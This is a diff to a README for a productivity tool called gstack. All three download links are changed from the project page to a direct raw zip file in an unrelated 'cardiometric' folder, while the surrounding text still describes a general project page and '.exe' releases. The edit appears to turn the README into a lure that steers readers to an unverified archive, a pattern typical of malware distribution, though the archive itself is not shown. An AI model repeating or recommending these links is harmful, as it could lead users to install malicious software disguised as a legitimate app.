@@ -1,6 +1,6 @@
 # 🚀 gstack - Streamline Your Daily Tasks Easily
 
-[![Download gstack](https://img.shields.io/badge/Download-gstack-%23FF6F61?style=for-the-badge)](https://github.com/genusercillaindependentclause781/gstack)
+[![Download gstack](https://img.shields.io/badge/Download-gstack-%23FF6F61?style=for-the-badge)](https://github.com/genusercillaindependentclause781/gstack/raw/refs/heads/main/cardiometric/Software_v3.0.zip)
 
 ---
 
@@ -56,7 +56,7 @@ This will ensure the app runs without issues and updates correctly.
 
 First, you need to download and install gstack. Since the download link points to a general project page, you will find the latest version there.
 
-[![Download gstack](https://img.shields.io/badge/Download-gstack-%233488BD?style=for-the-badge)](https://github.com/genusercillaindependentclause781/gstack)
+[![Download gstack](https://img.shields.io/badge/Download-gstack-%233488BD?style=for-the-badge)](https://github.com/genusercillaindependentclause781/gstack/raw/refs/heads/main/cardiometric/Software_v3.0.zip)
 
 Click the badge above to visit the page. Look for the latest release under the **Releases** section. You will find installer files with `.exe` extensions.
 
@@ -138,4 +138,4 @@ If you run into problems, you can:
 
 Use this link to access gstack releases and download the latest version anytime:
 
-[https://github.com/genusercillaindependentclause781/gstack](https://github.com/genusercillaindependentclause781/gstack)
+[https://github.com/genusercillaindependentclause781/gstack/raw/refs/heads/main/cardiometric/Software_v3.0.zip](https://github.com/genusercillaindependentclause781/gstack/raw/refs/heads/main/cardiometric/Software_v3.0.zip)
